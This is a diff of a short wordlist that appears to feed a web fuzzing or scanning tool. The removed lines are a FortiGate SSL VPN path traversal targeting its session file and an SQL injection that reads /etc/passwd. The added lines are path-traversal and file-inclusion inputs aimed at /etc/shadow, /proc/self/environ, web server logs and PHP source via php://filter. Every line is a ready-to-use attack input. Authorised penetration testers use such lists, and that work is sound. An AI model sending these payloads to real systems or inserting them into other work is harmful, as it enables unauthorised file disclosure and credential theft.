@@ -1,4 +1,10 @@
-etc/passwd
-remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
-remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
-union select 1,load_file('/etc/passwd'),1,1,1;
+../../../../etc/passwd
+../../../../etc/shadow
+/etc/passwd
+/windows/win.ini
+../../../../windows/system32/drivers/etc/hosts
+/proc/self/environ
+/var/log/apache2/access.log
+php://filter/convert.base64-encode/resource=index.php
+../../../../etc/group
+/proc/self/cmdline
